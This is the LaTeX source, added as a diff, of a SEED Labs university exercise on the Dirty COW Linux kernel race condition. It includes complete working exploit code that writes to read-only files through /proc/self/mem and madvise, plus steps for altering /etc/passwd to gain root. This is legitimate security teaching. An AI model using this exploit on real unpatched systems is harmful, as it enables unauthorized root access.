@@ -1,0 +1,312 @@
+\input{../../common-files/header}
+\input{../../common-files/copyright}
+
+
+\newcommand{\cowFigs}{./Figs}
+
+\lhead{\bfseries SEED Labs -- Dirty COW Attack Lab}
+
+
+\begin{document}
+
+\begin{center}
+{\LARGE Dirty COW Attack Lab}
+\end{center}
+
+\seedlabcopyright{2017}
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Overview}
+
+The Dirty COW vulnerability is an interesting case of
+the race condition vulnerability. It existed in the \linux kernel since
+September 2007, and was discovered and exploited in October 2016.
+The vulnerability affects all \linux-based operating systems, including
+Android, and its consequence is very severe: attackers can gain the root
+privilege by exploiting the vulnerability. The vulnerability resides
+in the code of copy-on-write inside \linux kernel. By exploiting this vulnerability, attackers
+can modify any protected file, even though these files are only readable to them.
+
+The objective of this lab is for students to gain the hands-on experience on the Dirty COW
+attack, understand the race condition vulnerability exploited by the attack, and 
+gain a deeper understanding of the general race condition security problems. In this lab,
+students will exploit the Dirty COW race condition vulnerability to gain the root privilege.  
+
+
+\paragraph{Readings and videos.}
+Detailed coverage of the Dirty COW attack can be found in the following:
+
+\begin{itemize}
+\item Chapter 8 of the SEED Book, \seedbook
+\item Section 7 of the SEED Lecture at Udemy, \seedcsvideo
+\end{itemize}
+
+
+\paragraph{Lab environment.} This lab has been tested on our pre-built
+Ubuntu 12.04 VM, which can be downloaded from the SEED website.
+If you are using our SEEDUbuntu 16.04 VM, this attack will not work, because the 
+vulnerability has already been patched in the kernel. 
+You can download the SEEDUbuntu12.04 VM from the SEED web
+site. If you have an Amazon EC2 account, you can find our VM from 
+the ``Community AMIs''. The name of the VM is 
+\texttt{SEEDUbuntu12.04-Generic}. It should be noted that
+Amazon's site says that this is a 64-bit VM; that is incorrect. The VM is
+32-bit. However, this incorrect information does not cause any problem.
+
+
+
+
+% *******************************************
+\section{Task 1: Modify a Dummy Read-Only File}
+
+The objective of this task is to write to a read-only file using the Dirty
+COW vulnerability. 
+
+
+\subsection{Create a Dummy File}
+
+We first need to select a target file. Although this file can be any read-only
+file in the system, we will use a dummy file in this task, so we do not corrupt 
+an important system file in
+case we make a mistake. Please create a file called \texttt{zzz} 
+in the root directory, change its permission to read-only for normal users,
+and put some random content into the file using an editor such as \texttt{gedit}. 
+
+\begin{lstlisting}
+$ sudo touch /zzz
+$ sudo chmod 644 /zzz
+$ sudo gedit /zzz
+$ cat /zzz
+111111222222333333
+$ ls -l /zzz
+-rw-r--r-- 1 root root 19 Oct 18 22:03 /zzz
+$ echo 99999 > /zzz
+bash: /zzz: (*@\texttt{Permission denied}@*)
+\end{lstlisting}
+ 
+From the above experiment, we can see that if we try to write to this file as a 
+normal user, we will fail, because the file is only readable to normal users. 
+However, because of the Dirty COW vulnerability in the system, we can
+find a way to write to this file. Our objective is to replace the pattern
+\texttt{"222222"} with \texttt{"******"}. 
+
+
+
+\subsection{Set Up the Memory Mapping Thread}
+
+
+You can download the program \texttt{cow\_attack.c} from the
+website of the lab. The program has three threads: the main thread, the write thread,
+and the madvise thread. 
+The main thread maps \texttt{/zzz} to memory, finds where the pattern
+\texttt{"222222"} is, and then creates two threads to exploit the 
+Dirty COW race condition vulnerability in the OS kernel. 
+
+\begin{lstlisting}[caption={The main thread},
+                   label=cow:code:cow_attack:main]
+/* cow_attack.c  (the main thread) */
+
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <sys/stat.h>
+#include <string.h>
+
+void *map;
+
+int main(int argc, char *argv[])
+{
+  pthread_t pth1,pth2;
+  struct stat st;
+  int file_size;
+
+  // Open the target file in the read-only mode.
+  int f=open("/zzz", O_RDONLY);
+
+  // Map the file to COW memory using MAP_PRIVATE.
+  fstat(f, &st);
+  file_size = st.st_size;
+  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+  // Find the position of the target area
+  char *position = strstr(map, "222222");                         (*@\ding{192}@*)
+
+  // We have to do the attack using two threads.
+  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); (*@\ding{193}@*)
+  pthread_create(&pth2, NULL, writeThread, position);             (*@\ding{194}@*)
+
+  // Wait for the threads to finish.
+  pthread_join(pth1, NULL);
+  pthread_join(pth2, NULL);
+  return 0;
+}
+
+\end{lstlisting}
+
+
+In the above code, we need to find where the pattern \texttt{"222222"}is. We
+use a string function called \texttt{strstr()} to find where \texttt{"222222"}
+is in the mapped memory~(Line~\ding{192}). We then start two threads:
+\texttt{madviseThread}~(Line~\ding{193}) and
+\texttt{writeThread}~(Line~\ding{194}).
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Set Up the \texttt{write} Thread}
+
+The job of the \texttt{write} thread listed in the following
+is to replace the string \texttt{"222222"} in the
+memory with \texttt{"******"}. Since the mapped memory is of COW type,
+this thread alone will only be able to modify the contents in a copy of the mapped memory, which
+will not cause any change to the underlying \texttt{/zzz} file.
+
+
+\begin{lstlisting}[caption={The \texttt{write} thread},
+                   label=cow:code:cow_attack:write]
+/* cow_attack.c (the write thread) */
+
+void *writeThread(void *arg)
+{
+  char *content= "******";
+  off_t offset = (off_t) arg;
+
+  int f=open("/proc/self/mem", O_RDWR);
+  while(1) {
+    // Move the file pointer to the corresponding position.
+    lseek(f, offset, SEEK_SET);
+    // Write to the memory.
+    write(f, content, strlen(content));
+  }
+}
+\end{lstlisting}
+
+
+\subsection{The \texttt{madvise} Thread}
+
+The \texttt{madvise} thread does only one thing: discarding the private copy of
+the mapped memory, so the page table can point back to the original mapped
+memory.
+
+
+\begin{lstlisting}[caption={The \texttt{madvise} thread},
+                   label=cow:code:cow_attack:madvise]
+/* cow_attack.c (the madvise thread) */
+
+void *madviseThread(void *arg)
+{
+  int file_size = (int) arg;
+  while(1){
+      madvise(map, file_size, MADV_DONTNEED);
+  }
+}
+\end{lstlisting}
+
+
+\subsection{Launch the Attack}
+
+If the \texttt{write()} and the \texttt{madvise()} system calls are invoked alternatively,
+i.e., one is invoked only after the other is finished, the \texttt{write}
+operation will always be performed on the private copy, and we will never be able to modify the
+target file.  The only way for the attack to succeed is to perform the \texttt{madvise()}
+system call while the \texttt{write()} system call is still running. We cannot always achieve
+that, so we need to try many times. As long as the probability is not extremely low,
+we have a chance. That is why in the threads, we run the two system calls in an infinite loop.
+Compile the \texttt{cow\_attack.c}  and run it for a few seconds. If
+your attack is successful, you should be able to see a modified \texttt{/zzz} file.
+Report your results in the lab report and explain how you are able to
+achieve that. 
+
+
+\begin{lstlisting}
+$ gcc cow_attack.c -lpthread
+$ a.out
+  ... press Ctrl-C after a few seconds ...
+\end{lstlisting}
+
+
+
+\section{Task 2: Modify the Password File to Gain the Root Privilege} 
+
+Now, let's launch the attack on a real system file, so we can gain the root privilege.
+We choose the \texttt{/etc/passwd} file as our target file. This file
+is world-readable, but non-root users cannot modify it. The file contains
+the user account information, one record for each user.  Assume that our user name is
+\texttt{seed} . The following lines show the records for root and \texttt{seed}:
+
+\begin{lstlisting}
+root:x:0:0:root:/root:/bin/bash
+seed:x:1000:1000:Seed,123,,:/home/seed:/bin/bash
+\end{lstlisting}
+
+Each of the above record contains seven colon-separated fields. Our interest is on the third
+field, which specifies the user ID~(UID) value assigned to a user. UID is the primary
+basis for access control in \linux, so this value is critical to security.
+The root user's UID field contains a special value 0; that is what makes it the superuser,
+not its name. Any user with UID \texttt{0} is treated by the system as root,
+regardless of what user name he or she has.
+The \texttt{seed} user's ID is only \texttt{1000}, so
+it does not have the root privilege. However, if we can change the value to
+\texttt{0}, we can turn it
+into root. We will exploit the Dirty COW vulnerability to achieve this goal.
+
+In our experiment, we will not use the \texttt{seed} account, because this account is used
+for most of the experiments in this book; if we forget to change the UID back after the
+experiment, other experiments will be affected.  Instead, we create a new account called
+\texttt{charlie}, and we will turn this normal user into root using
+the Dirty COW attack.
+Adding a new account can be achieved using the \texttt{adduser} command.
+After the account is created, a new
+record will be added to \texttt{/etc/passwd}.  See
+the following:
+
+\begin{lstlisting}
+$ sudo adduser charlie
+  ...
+$ cat /etc/passwd | grep charlie
+charlie:x:1001:1001:,,,:/home/charlie:/bin/bash
+\end{lstlisting}
+
+We suggest that you save a copy of the \texttt{/etc/passwd} file, just in case you 
+make a mistake and corrupt this file. An alternative is to take a snapshot of your VM before
+working on this lab, so you can always roll back if the VM got corrupted. 
+
+
+
+\paragraph{Task:} You need to modify the \texttt{charlie}'s entry in
+\texttt{/etc/passwd}, so the third field is changed from \texttt{1001} to 
+\texttt{0000}, essentially turning \texttt{charlie} into a root account. 
+The file is not writable to \texttt{charlie}, but we can use 
+the Dirty COW attack to write to this file. You can  
+modify the \texttt{cow\_attack.c} program from Task 1 to achieve 
+this goal. 
+
+After your attack is successful, if you switch user to \texttt{charlie}, you should be able to see the 
+\texttt{\#} sign at the shell prompt, which is an indicator of the root shell. If you 
+run the \texttt{id} command, you should be able to see that you have gained the root privilege. 
+
+\begin{lstlisting}
+seed@ubuntu$ su charlie
+Passwd: 
+root@ubuntu# id
+(*@\textbf{uid=0(root)}@*) gid=1001(charlie) groups=0(root),1001(charlie)
+\end{lstlisting}
+ 
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Submission}
+
+\seedsubmission
+
+
+
+\end{document}
